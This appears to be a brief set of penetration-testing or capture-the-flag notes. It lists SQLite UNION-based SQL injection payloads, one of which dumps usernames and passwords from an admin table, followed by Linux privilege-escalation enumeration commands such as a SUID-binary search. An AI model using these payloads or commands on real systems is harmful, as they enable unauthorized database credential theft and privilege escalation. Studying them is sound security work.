### Testing Stuff

```
' Union Select sqlite_version() '
' Union Select group_concat(sql) FROM sqlite_master '
' Union Select group_concat(username || ":" || password) FROM admintable '
```

Testing if this is done correctly

### System Enumeration

```bash
find / -user tyler 2>/dev/null
find / -user root -perm -4000 — exec ls -ldb {} \;
strings <filename>
find / -name "autoscript.sh"
```

```bash
id
```

